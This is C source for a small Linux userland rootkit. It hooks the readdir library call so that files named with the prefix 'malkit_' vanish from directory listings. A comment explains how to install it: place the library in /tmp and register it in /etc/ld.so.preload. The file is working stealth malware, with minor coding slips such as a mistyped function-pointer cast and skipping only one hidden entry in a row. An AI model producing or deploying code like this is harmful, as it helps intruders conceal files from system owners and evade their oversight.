#define _GNU_SOURCE
#include<string.h>
#include<stdio.h>
#include<dlfcn.h>
#include<errno.h>
#include<dirent.h>
#include<strings.h>
#include<unistd.h>
#include<stdint.h>
#include<stdlib.h>
#include<sys/stat.h>
#include<sys/types.h>

#define MAGIC_PREFIX "malkit_"
/*
struct dirent {
              ino_t          d_ino;        Inode number 
               off_t          d_off;        Not an offset; see below 
               unsigned short d_reclen;    Length of this record 
               unsigned char  d_type;       Type of file; not supported
                                              by all filesystem types 
               char           d_name[256];  Null-terminated filename 
           };

int lstat(const char *pathname, struct stat *statbuf){
    fprintf(stderr,"we are inside;)",pathname);
    return -1;
}
*/
/*
we move our library to /tmp
edit /etc/ld.so.preload to include tmnp
*/

struct dirent *readdir(DIR *dirp)
{
    struct dirent *pointer = NULL;
    struct dirent * (*orig_readdir)(DIR *dirp) = NULL;

    orig_readdir = (struct dirent (*)(DIR *)) dlsym(RTLD_NEXT,"readdir");

    if (!orig_readdir)
    {
        fprintf(stderr,"could not locate readdir");

        dirp = NULL;
        return NULL;
    }

    pointer = orig_readdir(dirp);

    if (!pointer){
        return pointer;
    }

    if (strstr(pointer ->d_name, MAGIC_PREFIX))
        pointer = orig_readdir(dirp);

    return pointer;
};
